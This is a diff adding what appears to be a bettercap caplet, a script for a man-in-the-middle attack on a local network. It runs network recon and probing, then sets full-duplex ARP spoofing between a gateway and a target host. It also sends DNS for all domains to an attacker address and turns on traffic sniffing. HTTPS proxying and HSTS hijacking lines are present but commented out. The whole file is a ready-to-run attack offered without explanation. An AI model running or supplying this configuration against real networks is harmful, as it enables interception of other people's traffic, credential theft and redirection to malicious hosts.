@@ -1,0 +1,34 @@
+net.recon on
+sleep 1
+net.probe on
+sleep 5
+set arp.spoof.fullduplex true
+set arp.spoof.targets 172.16.42.1, 172.16.42.119
+#set arp.spoof.targets 10.0.0.1, 10.0.0.43
+#arp.spoof on
+#net.probe on
+#sleep 4
+net.show
+sleep 3
+set arp.spoof.internal true
+#set http.proxy.blacklist 172.16.42.119
+#set http.proxy.whitelist * 
+#set https.proxy.blacklist 172.16.42.119 
+#set https.proxy.whitelist * 
+#set arp.spoof.targets 172.16.42.1, 172.16.42.119
+#set arp.spoof.whitelist 172.16.42.119
+sleep 1
+set dns.spoof.address 172.16.42.132
+sleep 1
+set dns.spoof.domains *
+set dns.spoof.all true
+#http.proxy on
+#https.proxy on
+net.sniff on
+arp.spoof on
+sleep 2
+#dns.spoof on
+sleep 2
+#hstshijack/hstshijack
+#sleep 3
+#https.proxy on
